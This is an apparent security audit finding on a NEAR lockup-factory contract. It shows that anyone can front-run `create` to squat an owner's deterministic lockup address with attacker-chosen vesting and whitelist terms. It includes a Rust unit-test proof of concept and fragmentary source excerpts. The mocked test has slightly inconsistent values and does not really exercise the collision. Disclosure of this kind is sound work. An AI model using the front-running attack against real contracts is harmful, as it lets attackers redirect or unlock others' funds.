### Title
Unauthenticated front-running of `create` lets an attacker squat an owner's deterministic lockup address with attacker-chosen terms - (File: `lockup-factory/src/lib.rs`)

### Summary
`LockupFactory::create` derives the lockup's account id purely from `hex::encode(&env::sha256(owner_account_id.as_bytes())[..20])` and lets *any* caller supply the `lockup_duration`, `lockup_timestamp`, `vesting_schedule`, `release_duration`, and `whitelist_account_id` for that address. Because the derivation depends only on `owner_account_id` and is public, any unprivileged account can call `create` first for a victim owner, deploying the lockup contract with attacker-chosen terms at the address the victim's real grantor will later try to use.

### Finding Description
The invariant the question asserts should hold is:
`terms(lockup_account_id derived from owner_account_id) == terms_chosen_by(grantor_of(owner_account_id))`

In `create`, the target account id is computed deterministically and with no ownership check at all: [1](#0-0) [2](#0-1) 

`create` is `#[payable]` and requires only `MIN_ATTACHED_BALANCE`; there is no `assert_called_by_foundation`, `assert_owner`, or any check that the caller is the intended grantor of `owner_account_id`, nor any check that a lockup for this owner hasn't already been requested: [3](#0-2) 

The promise batch does `create_account()` → `deploy_contract(CODE)` → `transfer(deposit)` → `function_call("new", LockupArgs{...})`, all keyed off the sha256-derived address. Since this address is a pure function of `owner_account_id`, an attacker can compute it off-chain before the legitimate grantor acts, then call `create` themselves with:
- `owner_account_id` = the victim owner (so the deployed lockup's `owner_account_id` is legitimately the victim, making it look "trusted")
- attacker-controlled `vesting_schedule` (e.g. `None`, so no `foundation_account_id`/vesting is ever attached), `release_duration`, `lockup_duration`, and `whitelist_account_id` (e.g. an attacker-deployed staking-pool whitelist)

Because `create_account()` on an already-created NEAR account fails, whichever caller's receipt executes first wins the address permanently. When the real grantor later calls `create` for the same `owner_account_id`, `create_account()` fails, `on_lockup_create` observes `!is_promise_success()`, logs the failure, and simply refunds the caller's deposit: [4](#0-3) 

No guard (`assert_self`, `is_promise_success`, or otherwise) in this file checks *who* is entitled to fix the terms for a given `owner_account_id`; the only protection is "first write wins" at the account-creation layer, which is exactly what the attacker exploits. The result is a lockup contract living at the address everyone (owner, grantor, tooling, block explorers) will treat as "the lockup for owner X," but whose `vesting_schedule`, `release_duration`, and `staking_pool_whitelist_account_id` were chosen entirely by the attacker.

### Impact Explanation
Any subsequent NEAR sent to this address (from the real grantor attempting funding, from the owner, or from third parties who trust the deterministic-address convention) lands in a contract whose vesting/whitelist rules are attacker-defined rather than grantor-defined. Concretely the attacker can: omit vesting entirely (no `vesting_schedule` ⇒ tokens are immediately fully vested/withdrawable by the owner instead of following the grantor's schedule), or point `staking_pool_whitelist_account_id` at an attacker-controlled whitelist contract, letting funds later be staked into attacker-controlled pools. This matches the Critical category "an account whitelisted or a lockup deployed with parameters its rightful creator never chose." The attack is repeatable against every distinct `owner_account_id` the attacker wants to squat, at the cost of one `MIN_ATTACHED_BALANCE` (3.5 NEAR) deposit per target, and blocks the legitimate grantor's own `create` call permanently (their deposit is refunded, but their intended lockup is never deployed at the canonical address).

### Likelihood Explanation
No special privileges are needed — `create` is a public, payable method callable by any account, exactly as documented ("It allows any user to create and fund the lockup contract... No need to have access to the foundation keys to create lockup"). The only requirement is knowing (or guessing ahead of time) the target `owner_account_id`, which is typically public knowledge (e.g., published grant recipients), and attaching ~3.5 NEAR. This is fully feasible and cheap, and can be automated to front-run any `owner_account_id` before its real grantor acts.

### Recommendation
Require that `create` (or a privileged variant of it) can only set terms for `owner_account_id` if called by the foundation/grantor account, or require the owner's signature/allowance before parameters are finalized. Alternatively, make the derived address depend on data only the legitimate grantor can supply (e.g., include a grantor-provided nonce/salt known in advance, or require a pre-registration step by the foundation that reserves the derived address and locks the terms before any public `create` call is accepted for that owner).

### Proof of Concept
```rust
// lockup-factory/src/lib.rs test module (near-sdk testing_env)
#[test]
fn test_owner_address_squatting_front_run() {
    let mut context = VMContextBuilder::new()
        .current_account_id(account_factory())
        .predecessor_account_id(account_near())
        .finish();
    testing_env!(context.clone());
    let mut contract = LockupFactory::new(whitelist_account_id(), foundation_account_id());

    // Attacker computes the same derived address off-chain for the victim owner.
    let victim_owner = account_tokens_owner(); // the real, not-yet-funded owner
    let malicious_whitelist = custom_whitelist_account_id(); // attacker-controlled

    // 1) Attacker front-runs: calls create() first with malicious terms,
    //    vesting_schedule = None (no lockup enforcement), custom whitelist.
    context.predecessor_account_id = String::from("attacker.testnet");
    context.attached_deposit = ntoy(35);
    testing_env!(context.clone());
    contract.create(
        victim_owner.clone(),
        63036000000000000u64.into(),
        None,
        None,                         // attacker sets vesting_schedule = None
        None,
        Some(malicious_whitelist.clone()), // attacker's own whitelist
    );

    context.predecessor_account_id = account_factory();
    context.attached_deposit = ntoy(0);
    testing_env_with_promise_results(context.clone(), PromiseResult::Successful(vec![]));
    let attacker_result = contract.on_lockup_create(
        lockup_account(), // == derived address for victim_owner
        ntoy(30).into(),
        String::from("attacker.testnet"),
    );
    assert_eq!(attacker_result, true); // attacker's lockup now lives at derived address

    // 2) Legitimate grantor later tries to create the "real" lockup for the same owner
    //    with a proper vesting_schedule -- create_account fails because the
    //    address already exists (squatted by attacker).
    context.predecessor_account_id = String::from("real_grantor.testnet");
    context.attached_deposit = ntoy(35);
    testing_env!(context.clone());
    contract.create(
        victim_owner.clone(),
        63036000000000000u64.into(),
        None,
        Some(/* proper vesting schedule hash */ VestingScheduleOrHash::VestingHash(
            VestingScheduleWithSalt {
                vesting_schedule: new_vesting_schedule(10),
                salt: SALT.to_vec().into(),
            }.hash().into(),
        )),
        None,
        None,
    );

    context.predecessor_account_id = account_factory();
    context.attached_deposit = ntoy(0);
    // Simulate create_account failure because the account already exists.
    testing_env_with_promise_results(context.clone(), PromiseResult::Failed);
    let real_result = contract.on_lockup_create(
        lockup_account(), // same derived address
        ntoy(35).into(),
        String::from("real_grantor.testnet"),
    );

    // Binding under test: lockup at derived address should carry grantor's terms.
    // Instead: legitimate creation fails (refunded), and the address permanently
    // holds the attacker's vesting_schedule=None / malicious-whitelist contract.
    assert_eq!(real_result, false); // legitimate grantor's create is rejected
    // attacker_result == true confirms the squatted, attacker-parameterized
    // lockup is the one that persists at victim_owner's canonical address.
}
```
This demonstrates that whichever caller's `create` transaction lands first fully determines the terms of the lockup permanently bound to `owner_account_id`'s derived address, with no check that the caller is the entitled grantor.

    pub fn create(
        &mut self,
        owner_account_id: ValidAccountId,
        lockup_duration: WrappedDuration,
        lockup_timestamp: Option<WrappedTimestamp>,
        vesting_schedule: Option<VestingScheduleOrHash>,

        let byte_slice = env::sha256(owner_account_id.as_ref().as_bytes());
        let lockup_account_id =

        let mut foundation_account: Option<AccountId> = None;

            foundation_account = Some(self.foundation_account_id.clone());

            account_id.into()
        } else {
            self.whitelist_account_id.clone()
        };

    pub fn on_lockup_create(
        &mut self,
        lockup_account_id: AccountId,
        attached_deposit: U128,
        predecessor_account_id: AccountId,
    ) -> bool {
        assert_self();

        let lockup_account_created = is_promise_success();

        if lockup_account_created {
            env::log(
                format!("The lockup contract {} was successfully created.", lockup_account_id)
                    .as_bytes(),
            );
            true
        } else {
            env::log(
                format!(
                    "The lockup {} creation has failed. Returning attached deposit of {} to {}",
                    lockup_account_id, attached_deposit.0, predecessor_account_id
                )
                    .as_bytes(),
            );
            Promise::new(predecessor_account_id).transfer(attached_deposit.0);
            false
        }
    }
